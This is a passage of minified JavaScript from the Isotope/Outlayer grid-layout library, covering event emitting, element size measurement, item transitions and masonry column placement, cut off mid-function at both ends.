		else
			for (o in e) e.hasOwnProperty(o) && (n = e[o]) && ("function" == typeof n ? r.call(this, o, n) : s.call(this, o, n));
		return this
	}, o.removeEvent = function(t) {
		var e, i = typeof t,
			o = this._getEvents();
		if ("string" === i) delete o[t];
		else if (t instanceof RegExp)
			for (e in o) o.hasOwnProperty(e) && t.test(e) && delete o[e];
		else delete this._events;
		return this
	}, o.removeAllListeners = i("removeEvent"), o.emitEvent = function(t, e) {
		var i, o, n, r, s = this.getListenersAsObject(t);
		for (n in s)
			if (s.hasOwnProperty(n))
				for (o = s[n].length; o--;) i = s[n][o], i.once === !0 && this.removeListener(t, i.listener), r = i.listener.apply(this, e || []), r === this._getOnceReturnValue() && this.removeListener(t, i.listener);
		return this
	}, o.trigger = i("emitEvent"), o.emit = function(t) {
		var e = Array.prototype.slice.call(arguments, 1);
		return this.emitEvent(t, e)
	}, o.setOnceReturnValue = function(t) {
		return this._onceReturnValue = t, this
	}, o._getOnceReturnValue = function() {
		return this.hasOwnProperty("_onceReturnValue") ? this._onceReturnValue : !0
	}, o._getEvents = function() {
		return this._events || (this._events = {})
	}, t.noConflict = function() {
		return n.EventEmitter = r, t
	}, "function" == typeof define && define.amd ? define("eventEmitter/EventEmitter", [], function() {
		return t
	}) : "object" == typeof module && module.exports ? module.exports = t : n.EventEmitter = t
}.call(this),
	function(t) {
		function e(t) {
			if (t) {
				if ("string" == typeof o[t]) return t;
				t = t.charAt(0).toUpperCase() + t.slice(1);
				for (var e, n = 0, r = i.length; r > n; n++)
					if (e = i[n] + t, "string" == typeof o[e]) return e
			}
		}
		var i = "Webkit Moz ms Ms O".split(" "),
			o = document.documentElement.style;
		"function" == typeof define && define.amd ? define("get-style-property/get-style-property", [], function() {
			return e
		}) : "object" == typeof exports ? module.exports = e : t.getStyleProperty = e
	}(window),
	function(t) {
		function e(t) {
			var e = parseFloat(t),
				i = -1 === t.indexOf("%") && !isNaN(e);
			return i && e
		}

		function i() {}

		function o() {
			for (var t = {
					width: 0,
					height: 0,
					innerWidth: 0,
					innerHeight: 0,
					outerWidth: 0,
					outerHeight: 0
				}, e = 0, i = s.length; i > e; e++) {
				var o = s[e];
				t[o] = 0
			}
			return t
		}

		function n(i) {
			function n() {
				if (!d) {
					d = !0;
					var o = t.getComputedStyle;
					if (p = function() {
							var t = o ? function(t) {
								return o(t, null)
							} : function(t) {
								return t.currentStyle
							};
							return function(e) {
								var i = t(e);
								return i || r("Style returned " + i + ". Are you running this code in a hidden iframe on Firefox? " + "See http://bit.ly/getsizebug1"), i
							}
						}(), h = i("boxSizing")) {
						var n = document.createElement("div");
						n.style.width = "200px", n.style.padding = "1px 2px 3px 4px", n.style.borderStyle = "solid", n.style.borderWidth = "1px 2px 3px 4px", n.style[h] = "border-box";
						var s = document.body || document.documentElement;
						s.appendChild(n);
						var a = p(n);
						f = 200 === e(a.width), s.removeChild(n)
					}
				}
			}

			function a(t) {
				if (n(), "string" == typeof t && (t = document.querySelector(t)), t && "object" == typeof t && t.nodeType) {
					var i = p(t);
					if ("none" === i.display) return o();
					var r = {};
					r.width = t.offsetWidth, r.height = t.offsetHeight;
					for (var a = r.isBorderBox = !(!h || !i[h] || "border-box" !== i[h]), d = 0, l = s.length; l > d; d++) {
						var c = s[d],
							y = i[c];
						y = u(t, y);
						var m = parseFloat(y);
						r[c] = isNaN(m) ? 0 : m
					}
					var g = r.paddingLeft + r.paddingRight,
						v = r.paddingTop + r.paddingBottom,
						_ = r.marginLeft + r.marginRight,
						I = r.marginTop + r.marginBottom,
						L = r.borderLeftWidth + r.borderRightWidth,
						z = r.borderTopWidth + r.borderBottomWidth,
						b = a && f,
						x = e(i.width);
					x !== !1 && (r.width = x + (b ? 0 : g + L));
					var S = e(i.height);
					return S !== !1 && (r.height = S + (b ? 0 : v + z)), r.innerWidth = r.width - (g + L), r.innerHeight = r.height - (v + z), r.outerWidth = r.width + _, r.outerHeight = r.height + I, r
				}
			}

			function u(e, i) {
				if (t.getComputedStyle || -1 === i.indexOf("%")) return i;
				var o = e.style,
					n = o.left,
					r = e.runtimeStyle,
					s = r && r.left;
				return s && (r.left = e.currentStyle.left), o.left = i, i = o.pixelLeft, o.left = n, s && (r.left = s), i
			}
			var p, h, f, d = !1;
			return a
		}
		var r = "undefined" == typeof console ? i : function(t) {
				console.error(t)
			},
			s = ["paddingLeft", "paddingRight", "paddingTop", "paddingBottom", "marginLeft", "marginRight", "marginTop", "marginBottom", "borderLeftWidth", "borderRightWidth", "borderTopWidth", "borderBottomWidth"];
		"function" == typeof define && define.amd ? define("get-size/get-size", ["get-style-property/get-style-property"], n) : "object" == typeof exports ? module.exports = n(require("desandro-get-style-property")) : t.getSize = n(t.getStyleProperty)
	}(window),
	function(t) {
		function e(t, e) {
			return t[s](e)
		}

		function i(t) {
			if (!t.parentNode) {
				var e = document.createDocumentFragment();
				e.appendChild(t)
			}
		}

		function o(t, e) {
			i(t);
			for (var o = t.parentNode.querySelectorAll(e), n = 0, r = o.length; r > n; n++)
				if (o[n] === t) return !0;
			return !1
		}

		function n(t, o) {
			return i(t), e(t, o)
		}
		var r, s = function() {
			if (t.matchesSelector) return "matchesSelector";
			for (var e = ["webkit", "moz", "ms", "o"], i = 0, o = e.length; o > i; i++) {
				var n = e[i],
					r = n + "MatchesSelector";
				if (t[r]) return r
			}
		}();
		if (s) {
			var a = document.createElement("div"),
				u = e(a, "div");
			r = u ? e : n
		} else r = o;
		"function" == typeof define && define.amd ? define("matches-selector/matches-selector", [], function() {
			return r
		}) : "object" == typeof exports ? module.exports = r : window.matchesSelector = r
	}(Element.prototype),
	function(t) {
		function e(t, e) {
			for (var i in e) t[i] = e[i];
			return t
		}

		function i(t) {
			for (var e in t) return !1;
			return e = null, !0
		}

		function o(t) {
			return t.replace(/([A-Z])/g, function(t) {
				return "-" + t.toLowerCase()
			})
		}

		function n(t, n, r) {
			function a(t, e) {
				t && (this.element = t, this.layout = e, this.position = {
					x: 0,
					y: 0
				}, this._create())
			}
			var u = r("transition"),
				p = r("transform"),
				h = u && p,
				f = !!r("perspective"),
				d = {
					WebkitTransition: "webkitTransitionEnd",
					MozTransition: "transitionend",
					OTransition: "otransitionend",
					transition: "transitionend"
				}[u],
				l = ["transform", "transition", "transitionDuration", "transitionProperty"],
				c = function() {
					for (var t = {}, e = 0, i = l.length; i > e; e++) {
						var o = l[e],
							n = r(o);
						n && n !== o && (t[o] = n)
					}
					return t
				}();
			e(a.prototype, t.prototype), a.prototype._create = function() {
				this._transn = {
					ingProperties: {},
					clean: {},
					onEnd: {}
				}, this.css({
					position: "absolute"
				})
			}, a.prototype.handleEvent = function(t) {
				var e = "on" + t.type;
				this[e] && this[e](t)
			}, a.prototype.getSize = function() {
				this.size = n(this.element)
			}, a.prototype.css = function(t) {
				var e = this.element.style;
				for (var i in t) {
					var o = c[i] || i;
					e[o] = t[i]
				}
			}, a.prototype.getPosition = function() {
				var t = s(this.element),
					e = this.layout.options,
					i = e.isOriginLeft,
					o = e.isOriginTop,
					n = parseInt(t[i ? "left" : "right"], 10),
					r = parseInt(t[o ? "top" : "bottom"], 10);
				n = isNaN(n) ? 0 : n, r = isNaN(r) ? 0 : r;
				var a = this.layout.size;
				n -= i ? a.paddingLeft : a.paddingRight, r -= o ? a.paddingTop : a.paddingBottom, this.position.x = n, this.position.y = r
			}, a.prototype.layoutPosition = function() {
				var t = this.layout.size,
					e = this.layout.options,
					i = {};
				e.isOriginLeft ? (i.left = this.position.x + t.paddingLeft + "px", i.right = "") : (i.right = this.position.x + t.paddingRight + "px", i.left = ""), e.isOriginTop ? (i.top = this.position.y + t.paddingTop + "px", i.bottom = "") : (i.bottom = this.position.y + t.paddingBottom + "px", i.top = ""), this.css(i), this.emitEvent("layout", [this])
			};
			var y = f ? function(t, e) {
				return "translate3d(" + t + "px, " + e + "px, 0)"
			} : function(t, e) {
				return "translate(" + t + "px, " + e + "px)"
			};
			a.prototype._transitionTo = function(t, e) {
				this.getPosition();
				var i = this.position.x,
					o = this.position.y,
					n = parseInt(t, 10),
					r = parseInt(e, 10),
					s = n === this.position.x && r === this.position.y;
				if (this.setPosition(t, e), s && !this.isTransitioning) return this.layoutPosition(), void 0;
				var a = t - i,
					u = e - o,
					p = {},
					h = this.layout.options;
				a = h.isOriginLeft ? a : -a, u = h.isOriginTop ? u : -u, p.transform = y(a, u), this.transition({
					to: p,
					onTransitionEnd: {
						transform: this.layoutPosition
					},
					isCleaning: !0
				})
			}, a.prototype.goTo = function(t, e) {
				this.setPosition(t, e), this.layoutPosition()
			}, a.prototype.moveTo = h ? a.prototype._transitionTo : a.prototype.goTo, a.prototype.setPosition = function(t, e) {
				this.position.x = parseInt(t, 10), this.position.y = parseInt(e, 10)
			}, a.prototype._nonTransition = function(t) {
				this.css(t.to), t.isCleaning && this._removeStyles(t.to);
				for (var e in t.onTransitionEnd) t.onTransitionEnd[e].call(this)
			}, a.prototype._transition = function(t) {
				if (!parseFloat(this.layout.options.transitionDuration)) return this._nonTransition(t), void 0;
				var e = this._transn;
				for (var i in t.onTransitionEnd) e.onEnd[i] = t.onTransitionEnd[i];
				for (i in t.to) e.ingProperties[i] = !0, t.isCleaning && (e.clean[i] = !0);
				if (t.from) {
					this.css(t.from);
					var o = this.element.offsetHeight;
					o = null
				}
				this.enableTransition(t.to), this.css(t.to), this.isTransitioning = !0
			};
			var m = p && o(p) + ",opacity";
			a.prototype.enableTransition = function() {
				this.isTransitioning || (this.css({
					transitionProperty: m,
					transitionDuration: this.layout.options.transitionDuration
				}), this.element.addEventListener(d, this, !1))
			}, a.prototype.transition = a.prototype[u ? "_transition" : "_nonTransition"], a.prototype.onwebkitTransitionEnd = function(t) {
				this.ontransitionend(t)
			}, a.prototype.onotransitionend = function(t) {
				this.ontransitionend(t)
			};
			var g = {
				"-webkit-transform": "transform",
				"-moz-transform": "transform",
				"-o-transform": "transform"
			};
			a.prototype.ontransitionend = function(t) {
				if (t.target === this.element) {
					var e = this._transn,
						o = g[t.propertyName] || t.propertyName;
					if (delete e.ingProperties[o], i(e.ingProperties) && this.disableTransition(), o in e.clean && (this.element.style[t.propertyName] = "", delete e.clean[o]), o in e.onEnd) {
						var n = e.onEnd[o];
						n.call(this), delete e.onEnd[o]
					}
					this.emitEvent("transitionEnd", [this])
				}
			}, a.prototype.disableTransition = function() {
				this.removeTransitionStyles(), this.element.removeEventListener(d, this, !1), this.isTransitioning = !1
			}, a.prototype._removeStyles = function(t) {
				var e = {};
				for (var i in t) e[i] = "";
				this.css(e)
			};
			var v = {
				transitionProperty: "",
				transitionDuration: ""
			};
			return a.prototype.removeTransitionStyles = function() {
				this.css(v)
			}, a.prototype.removeElem = function() {
				this.element.parentNode.removeChild(this.element), this.emitEvent("remove", [this])
			}, a.prototype.remove = function() {
				if (!u || !parseFloat(this.layout.options.transitionDuration)) return this.removeElem(), void 0;
				var t = this;
				this.on("transitionEnd", function() {
					return t.removeElem(), !0
				}), this.hide()
			}, a.prototype.reveal = function() {
				delete this.isHidden, this.css({
					display: ""
				});
				var t = this.layout.options;
				this.transition({
					from: t.hiddenStyle,
					to: t.visibleStyle,
					isCleaning: !0
				})
			}, a.prototype.hide = function() {
				this.isHidden = !0, this.css({
					display: ""
				});
				var t = this.layout.options;
				this.transition({
					from: t.visibleStyle,
					to: t.hiddenStyle,
					isCleaning: !0,
					onTransitionEnd: {
						opacity: function() {
							this.isHidden && this.css({
								display: "none"
							})
						}
					}
				})
			}, a.prototype.destroy = function() {
				this.css({
					position: "",
					left: "",
					right: "",
					top: "",
					bottom: "",
					transition: "",
					transform: ""
				})
			}, a
		}
		var r = t.getComputedStyle,
			s = r ? function(t) {
				return r(t, null)
			} : function(t) {
				return t.currentStyle
			};
		"function" == typeof define && define.amd ? define("outlayer/item", ["eventEmitter/EventEmitter", "get-size/get-size", "get-style-property/get-style-property"], n) : "object" == typeof exports ? module.exports = n(require("wolfy87-eventemitter"), require("get-size"), require("desandro-get-style-property")) : (t.Outlayer = {}, t.Outlayer.Item = n(t.EventEmitter, t.getSize, t.getStyleProperty))
	}(window),
	function(t) {
		function e(t, e) {
			for (var i in e) t[i] = e[i];
			return t
		}

		function i(t) {
			return "[object Array]" === f.call(t)
		}

		function o(t) {
			var e = [];
			if (i(t)) e = t;
			else if (t && "number" == typeof t.length)
				for (var o = 0, n = t.length; n > o; o++) e.push(t[o]);
			else e.push(t);
			return e
		}

		function n(t, e) {
			var i = l(e, t); - 1 !== i && e.splice(i, 1)
		}

		function r(t) {
			return t.replace(/(.)([A-Z])/g, function(t, e, i) {
				return e + "-" + i
			}).toLowerCase()
		}

		function s(i, s, f, l, c, y) {
			function m(t, i) {
				if ("string" == typeof t && (t = a.querySelector(t)), !t || !d(t)) return u && u.error("Bad " + this.constructor.namespace + " element: " + t), void 0;
				this.element = t, this.options = e({}, this.constructor.defaults), this.option(i);
				var o = ++g;
				this.element.outlayerGUID = o, v[o] = this, this._create(), this.options.isInitLayout && this.layout()
			}
			var g = 0,
				v = {};
			return m.namespace = "outlayer", m.Item = y, m.defaults = {
				containerStyle: {
					position: "relative"
				},
				isInitLayout: !0,
				isOriginLeft: !0,
				isOriginTop: !0,
				isResizeBound: !0,
				isResizingContainer: !0,
				transitionDuration: "0.4s",
				hiddenStyle: {
					opacity: 0,
					transform: "scale(0.001)"
				},
				visibleStyle: {
					opacity: 1,
					transform: "scale(1)"
				}
			}, e(m.prototype, f.prototype), m.prototype.option = function(t) {
				e(this.options, t)
			}, m.prototype._create = function() {
				this.reloadItems(), this.stamps = [], this.stamp(this.options.stamp), e(this.element.style, this.options.containerStyle), this.options.isResizeBound && this.bindResize()
			}, m.prototype.reloadItems = function() {
				this.items = this._itemize(this.element.children)
			}, m.prototype._itemize = function(t) {
				for (var e = this._filterFindItemElements(t), i = this.constructor.Item, o = [], n = 0, r = e.length; r > n; n++) {
					var s = e[n],
						a = new i(s, this);
					o.push(a)
				}
				return o
			}, m.prototype._filterFindItemElements = function(t) {
				t = o(t);
				for (var e = this.options.itemSelector, i = [], n = 0, r = t.length; r > n; n++) {
					var s = t[n];
					if (d(s))
						if (e) {
							c(s, e) && i.push(s);
							for (var a = s.querySelectorAll(e), u = 0, p = a.length; p > u; u++) i.push(a[u])
						} else i.push(s)
				}
				return i
			}, m.prototype.getItemElements = function() {
				for (var t = [], e = 0, i = this.items.length; i > e; e++) t.push(this.items[e].element);
				return t
			}, m.prototype.layout = function() {
				this._resetLayout(), this._manageStamps();
				var t = void 0 !== this.options.isLayoutInstant ? this.options.isLayoutInstant : !this._isLayoutInited;
				this.layoutItems(this.items, t), this._isLayoutInited = !0
			}, m.prototype._init = m.prototype.layout, m.prototype._resetLayout = function() {
				this.getSize()
			}, m.prototype.getSize = function() {
				this.size = l(this.element)
			}, m.prototype._getMeasurement = function(t, e) {
				var i, o = this.options[t];
				o ? ("string" == typeof o ? i = this.element.querySelector(o) : d(o) && (i = o), this[t] = i ? l(i)[e] : o) : this[t] = 0
			}, m.prototype.layoutItems = function(t, e) {
				t = this._getItemsForLayout(t), this._layoutItems(t, e), this._postLayout()
			}, m.prototype._getItemsForLayout = function(t) {
				for (var e = [], i = 0, o = t.length; o > i; i++) {
					var n = t[i];
					n.isIgnored || e.push(n)
				}
				return e
			}, m.prototype._layoutItems = function(t, e) {
				function i() {
					o.emitEvent("layoutComplete", [o, t])
				}
				var o = this;
				if (!t || !t.length) return i(), void 0;
				this._itemsOn(t, "layout", i);
				for (var n = [], r = 0, s = t.length; s > r; r++) {
					var a = t[r],
						u = this._getItemLayoutPosition(a);
					u.item = a, u.isInstant = e || a.isLayoutInstant, n.push(u)
				}
				this._processLayoutQueue(n)
			}, m.prototype._getItemLayoutPosition = function() {
				return {
					x: 0,
					y: 0
				}
			}, m.prototype._processLayoutQueue = function(t) {
				for (var e = 0, i = t.length; i > e; e++) {
					var o = t[e];
					this._positionItem(o.item, o.x, o.y, o.isInstant)
				}
			}, m.prototype._positionItem = function(t, e, i, o) {
				o ? t.goTo(e, i) : t.moveTo(e, i)
			}, m.prototype._postLayout = function() {
				this.resizeContainer()
			}, m.prototype.resizeContainer = function() {
				if (this.options.isResizingContainer) {
					var t = this._getContainerSize();
					t && (this._setContainerMeasure(t.width, !0), this._setContainerMeasure(t.height, !1))
				}
			}, m.prototype._getContainerSize = h, m.prototype._setContainerMeasure = function(t, e) {
				if (void 0 !== t) {
					var i = this.size;
					i.isBorderBox && (t += e ? i.paddingLeft + i.paddingRight + i.borderLeftWidth + i.borderRightWidth : i.paddingBottom + i.paddingTop + i.borderTopWidth + i.borderBottomWidth), t = Math.max(t, 0), this.element.style[e ? "width" : "height"] = t + "px"
				}
			}, m.prototype._itemsOn = function(t, e, i) {
				function o() {
					return n++, n === r && i.call(s), !0
				}
				for (var n = 0, r = t.length, s = this, a = 0, u = t.length; u > a; a++) {
					var p = t[a];
					p.on(e, o)
				}
			}, m.prototype.ignore = function(t) {
				var e = this.getItem(t);
				e && (e.isIgnored = !0)
			}, m.prototype.unignore = function(t) {
				var e = this.getItem(t);
				e && delete e.isIgnored
			}, m.prototype.stamp = function(t) {
				if (t = this._find(t)) {
					this.stamps = this.stamps.concat(t);
					for (var e = 0, i = t.length; i > e; e++) {
						var o = t[e];
						this.ignore(o)
					}
				}
			}, m.prototype.unstamp = function(t) {
				if (t = this._find(t))
					for (var e = 0, i = t.length; i > e; e++) {
						var o = t[e];
						n(o, this.stamps), this.unignore(o)
					}
			}, m.prototype._find = function(t) {
				return t ? ("string" == typeof t && (t = this.element.querySelectorAll(t)), t = o(t)) : void 0
			}, m.prototype._manageStamps = function() {
				if (this.stamps && this.stamps.length) {
					this._getBoundingRect();
					for (var t = 0, e = this.stamps.length; e > t; t++) {
						var i = this.stamps[t];
						this._manageStamp(i)
					}
				}
			}, m.prototype._getBoundingRect = function() {
				var t = this.element.getBoundingClientRect(),
					e = this.size;
				this._boundingRect = {
					left: t.left + e.paddingLeft + e.borderLeftWidth,
					top: t.top + e.paddingTop + e.borderTopWidth,
					right: t.right - (e.paddingRight + e.borderRightWidth),
					bottom: t.bottom - (e.paddingBottom + e.borderBottomWidth)
				}
			}, m.prototype._manageStamp = h, m.prototype._getElementOffset = function(t) {
				var e = t.getBoundingClientRect(),
					i = this._boundingRect,
					o = l(t),
					n = {
						left: e.left - i.left - o.marginLeft,
						top: e.top - i.top - o.marginTop,
						right: i.right - e.right - o.marginRight,
						bottom: i.bottom - e.bottom - o.marginBottom
					};
				return n
			}, m.prototype.handleEvent = function(t) {
				var e = "on" + t.type;
				this[e] && this[e](t)
			}, m.prototype.bindResize = function() {
				this.isResizeBound || (i.bind(t, "resize", this), this.isResizeBound = !0)
			}, m.prototype.unbindResize = function() {
				this.isResizeBound && i.unbind(t, "resize", this), this.isResizeBound = !1
			}, m.prototype.onresize = function() {
				function t() {
					e.resize(), delete e.resizeTimeout
				}
				this.resizeTimeout && clearTimeout(this.resizeTimeout);
				var e = this;
				this.resizeTimeout = setTimeout(t, 100)
			}, m.prototype.resize = function() {
				this.isResizeBound && this.needsResizeLayout() && this.layout()
			}, m.prototype.needsResizeLayout = function() {
				var t = l(this.element),
					e = this.size && t;
				return e && t.innerWidth !== this.size.innerWidth
			}, m.prototype.addItems = function(t) {
				var e = this._itemize(t);
				return e.length && (this.items = this.items.concat(e)), e
			}, m.prototype.appended = function(t) {
				var e = this.addItems(t);
				e.length && (this.layoutItems(e, !0), this.reveal(e))
			}, m.prototype.prepended = function(t) {
				var e = this._itemize(t);
				if (e.length) {
					var i = this.items.slice(0);
					this.items = e.concat(i), this._resetLayout(), this._manageStamps(), this.layoutItems(e, !0), this.reveal(e), this.layoutItems(i)
				}
			}, m.prototype.reveal = function(t) {
				var e = t && t.length;
				if (e)
					for (var i = 0; e > i; i++) {
						var o = t[i];
						o.reveal()
					}
			}, m.prototype.hide = function(t) {
				var e = t && t.length;
				if (e)
					for (var i = 0; e > i; i++) {
						var o = t[i];
						o.hide()
					}
			}, m.prototype.getItem = function(t) {
				for (var e = 0, i = this.items.length; i > e; e++) {
					var o = this.items[e];
					if (o.element === t) return o
				}
			}, m.prototype.getItems = function(t) {
				if (t && t.length) {
					for (var e = [], i = 0, o = t.length; o > i; i++) {
						var n = t[i],
							r = this.getItem(n);
						r && e.push(r)
					}
					return e
				}
			}, m.prototype.remove = function(t) {
				t = o(t);
				var e = this.getItems(t);
				if (e && e.length) {
					this._itemsOn(e, "remove", function() {
						this.emitEvent("removeComplete", [this, e])
					});
					for (var i = 0, r = e.length; r > i; i++) {
						var s = e[i];
						s.remove(), n(s, this.items)
					}
				}
			}, m.prototype.destroy = function() {
				var t = this.element.style;
				t.height = "", t.position = "", t.width = "";
				for (var e = 0, i = this.items.length; i > e; e++) {
					var o = this.items[e];
					o.destroy()
				}
				this.unbindResize();
				var n = this.element.outlayerGUID;
				delete v[n], delete this.element.outlayerGUID, p && p.removeData(this.element, this.constructor.namespace)
			}, m.data = function(t) {
				var e = t && t.outlayerGUID;
				return e && v[e]
			}, m.create = function(t, i) {
				function o() {
					m.apply(this, arguments)
				}
				return Object.create ? o.prototype = Object.create(m.prototype) : e(o.prototype, m.prototype), o.prototype.constructor = o, o.defaults = e({}, m.defaults), e(o.defaults, i), o.prototype.settings = {}, o.namespace = t, o.data = m.data, o.Item = function() {
					y.apply(this, arguments)
				}, o.Item.prototype = new y, s(function() {
					for (var e = r(t), i = a.querySelectorAll(".js-" + e), n = "data-" + e + "-options", s = 0, h = i.length; h > s; s++) {
						var f, d = i[s],
							l = d.getAttribute(n);
						try {
							f = l && JSON.parse(l)
						} catch (c) {
							u && u.error("Error parsing " + n + " on " + d.nodeName.toLowerCase() + (d.id ? "#" + d.id : "") + ": " + c);
							continue
						}
						var y = new o(d, f);
						p && p.data(d, t, y)
					}
				}), p && p.bridget && p.bridget(t, o), o
			}, m.Item = y, m
		}
		var a = t.document,
			u = t.console,
			p = t.jQuery,
			h = function() {},
			f = Object.prototype.toString,
			d = "function" == typeof HTMLElement || "object" == typeof HTMLElement ? function(t) {
				return t instanceof HTMLElement
			} : function(t) {
				return t && "object" == typeof t && 1 === t.nodeType && "string" == typeof t.nodeName
			},
			l = Array.prototype.indexOf ? function(t, e) {
				return t.indexOf(e)
			} : function(t, e) {
				for (var i = 0, o = t.length; o > i; i++)
					if (t[i] === e) return i;
				return -1
			};
		"function" == typeof define && define.amd ? define("outlayer/outlayer", ["eventie/eventie", "doc-ready/doc-ready", "eventEmitter/EventEmitter", "get-size/get-size", "matches-selector/matches-selector", "./item"], s) : "object" == typeof exports ? module.exports = s(require("eventie"), require("doc-ready"), require("wolfy87-eventemitter"), require("get-size"), require("desandro-matches-selector"), require("./item")) : t.Outlayer = s(t.eventie, t.docReady, t.EventEmitter, t.getSize, t.matchesSelector, t.Outlayer.Item)
	}(window),
	function(t) {
		function e(t) {
			function e() {
				t.Item.apply(this, arguments)
			}
			e.prototype = new t.Item, e.prototype._create = function() {
				this.id = this.layout.itemGUID++, t.Item.prototype._create.call(this), this.sortData = {}
			}, e.prototype.updateSortData = function() {
				if (!this.isIgnored) {
					this.sortData.id = this.id, this.sortData["original-order"] = this.id, this.sortData.random = Math.random();
					var t = this.layout.options.getSortData,
						e = this.layout._sorters;
					for (var i in t) {
						var o = e[i];
						this.sortData[i] = o(this.element, this)
					}
				}
			};
			var i = e.prototype.destroy;
			return e.prototype.destroy = function() {
				i.apply(this, arguments), this.css({
					display: ""
				})
			}, e
		}
		"function" == typeof define && define.amd ? define("isotope/js/item", ["outlayer/outlayer"], e) : "object" == typeof exports ? module.exports = e(require("outlayer")) : (t.Isotope = t.Isotope || {}, t.Isotope.Item = e(t.Outlayer))
	}(window),
	function(t) {
		function e(t, e) {
			function i(t) {
				this.isotope = t, t && (this.options = t.options[this.namespace], this.element = t.element, this.items = t.filteredItems, this.size = t.size)
			}
			return function() {
				function t(t) {
					return function() {
						return e.prototype[t].apply(this.isotope, arguments)
					}
				}
				for (var o = ["_resetLayout", "_getItemLayoutPosition", "_manageStamp", "_getContainerSize", "_getElementOffset", "needsResizeLayout"], n = 0, r = o.length; r > n; n++) {
					var s = o[n];
					i.prototype[s] = t(s)
				}
			}(), i.prototype.needsVerticalResizeLayout = function() {
				var e = t(this.isotope.element),
					i = this.isotope.size && e;
				return i && e.innerHeight !== this.isotope.size.innerHeight
			}, i.prototype._getMeasurement = function() {
				this.isotope._getMeasurement.apply(this, arguments)
			}, i.prototype.getColumnWidth = function() {
				this.getSegmentSize("column", "Width")
			}, i.prototype.getRowHeight = function() {
				this.getSegmentSize("row", "Height")
			}, i.prototype.getSegmentSize = function(t, e) {
				var i = t + e,
					o = "outer" + e;
				if (this._getMeasurement(i, o), !this[i]) {
					var n = this.getFirstItemSize();
					this[i] = n && n[o] || this.isotope.size["inner" + e]
				}
			}, i.prototype.getFirstItemSize = function() {
				var e = this.isotope.filteredItems[0];
				return e && e.element && t(e.element)
			}, i.prototype.layout = function() {
				this.isotope.layout.apply(this.isotope, arguments)
			}, i.prototype.getSize = function() {
				this.isotope.getSize(), this.size = this.isotope.size
			}, i.modes = {}, i.create = function(t, e) {
				function o() {
					i.apply(this, arguments)
				}
				return o.prototype = new i, e && (o.options = e), o.prototype.namespace = t, i.modes[t] = o, o
			}, i
		}
		"function" == typeof define && define.amd ? define("isotope/js/layout-mode", ["get-size/get-size", "outlayer/outlayer"], e) : "object" == typeof exports ? module.exports = e(require("get-size"), require("outlayer")) : (t.Isotope = t.Isotope || {}, t.Isotope.LayoutMode = e(t.getSize, t.Outlayer))
	}(window),
	function(t) {
		function e(t, e) {
			var o = t.create("masonry");
			return o.prototype._resetLayout = function() {
				this.getSize(), this._getMeasurement("columnWidth", "outerWidth"), this._getMeasurement("gutter", "outerWidth"), this.measureColumns();
				var t = this.cols;
				for (this.colYs = []; t--;) this.colYs.push(0);
				this.maxY = 0
			}, o.prototype.measureColumns = function() {
				if (this.getContainerWidth(), !this.columnWidth) {
					var t = this.items[0],
						i = t && t.element;
					this.columnWidth = i && e(i).outerWidth || this.containerWidth
				}
				this.columnWidth += this.gutter, this.cols = Math.floor((this.containerWidth + this.gutter) / this.columnWidth), this.cols = Math.max(this.cols, 1)
			}, o.prototype.getContainerWidth = function() {
				var t = this.options.isFitWidth ? this.element.parentNode : this.element,
					i = e(t);
				this.containerWidth = i && i.innerWidth
			}, o.prototype._getItemLayoutPosition = function(t) {
				t.getSize();
				var e = t.size.outerWidth % this.columnWidth,
					o = e && 1 > e ? "round" : "ceil",
					n = Math[o](t.size.outerWidth / this.columnWidth);
				n = Math.min(n, this.cols);
				for (var r = this._getColGroup(n), s = Math.min.apply(Math, r), a = i(r, s), u = {
						x: this.columnWidth * a,
						y: s
					}, p = s + t.size.outerHeight, h = this.cols + 1 - r.length, f = 0; h > f; f++) this.colYs[a + f] = p;
				return u
			}, o.prototype._getColGroup = function(t) {
				if (2 > t) return this.colYs;
				for (var e = [], i = this.cols + 1 - t, o = 0; i > o; o++) {
					var n = this.colYs.slice(o, o + t);
					e[o] = Math.max.apply(Math, n)
				}
				return e
			}, o.prototype._manageStamp = function(t) {
				var i = e(t),
					o = this._getElementOffset(t),
					n = this.options.isOriginLeft ? o.left : o.right,
					r = n + i.outerWidth,
					s = Math.floor(n / this.columnWidth);
				s = Math.max(0, s);
				var a = Math.floor(r / this.columnWidth);
				a -= r % this.columnWidth ? 0 : 1, a = Math.min(this.cols - 1, a);
				for (var u = (this.options.isOriginTop ? o.top : o.bottom) + i.outerHeight, p = s; a >= p; p++) this.colYs[p] = Math.max(u, this.colYs[p])
			}, o.prototype._getContainerSize = function() {
				this.maxY = Math.max.apply(Math, this.colYs);
				var t = {
					height: this.maxY
				};
				return this.options.isFitWidth && (t.width = this._getContainerFitWidth()), t
			}, o.prototype._getContainerFitWidth = function() {
				for (var t = 0, e = this.cols; --e && 0 === this.colYs[e];) t++;
				return (this.cols - t) * this.columnWidth - this.gutter
			}, o.prototype.needsResizeLayout = function() {
				var t = this.containerWidth;
				return this.getContainerWidth(), t !== this.containerWidth
			}, o
		}
		var i = Array.prototype.indexOf ? function(t, e) {
			return t.indexOf(e)
		} : function(t, e) {
			for (var i = 0, o = t.length; o > i; i++) {
				var n = t[i];
				if (n === e) return i
			}
			return -1
		};
		"function" == typeof define && define.amd ? define("masonry/masonry", ["outlayer/outlayer", "get-size/get-size"], e) : "object" == typeof exports ? module.exports = e(require("outlayer"), require("get-size")) : t.Masonry = e(t.Outlayer, t.getSize)
	}(window),
	function(t) {
		function e(t, e) {
			for (var i in e) t[i] = e[i];
			return t
		}

		function i(t, i) {
			var o = t.create("masonry"),
				n = o.prototype._getElementOffset,
				r = o.prototype.layout,
				s = o.prototype._getMeasurement;
			e(o.prototype, i.prototype), o.prototype._getElementOffset = n, o.prototype.layout = r, o.prototype._getMeasurement = s;
			var a = o.prototype.measureColumns;
			o.prototype.measureColumns = function() {
				this.items = this.isotope.filteredItems, a.call(this)
			};
			var u = o.prototype._manageStamp;
			return o.prototype._manageStamp = function() {
				this.options.isOriginLeft = this.isotope.options.isOriginLeft, this.options.isOriginTop = this.isotope.options.isOriginTop, u.apply(this, arguments)
			}, o
		}
		"function" == typeof define && define.amd ? define("isotope/js/layout-modes/masonry", ["../layout-mode", "masonry/masonry"], i) : "object" == typeof exports ? module.exports = i(require("../layout-mode"), require("masonry-layout")) : i(t.Isotope.LayoutMode, t.Masonry)
	}(window),
	function(t) {
		function e(t) {
			var e = t.create("fitRows");
			return e.prototype._resetLayout = function() {
				this.x = 0, this.y = 0, this.maxY = 0, this._getMeasurement("gutter", "outerWidth")
			}, e.prototype._getItemLayoutPosition = function(t) {
				t.getSize();
				var e = t.size.outerWidth + this.gutter,
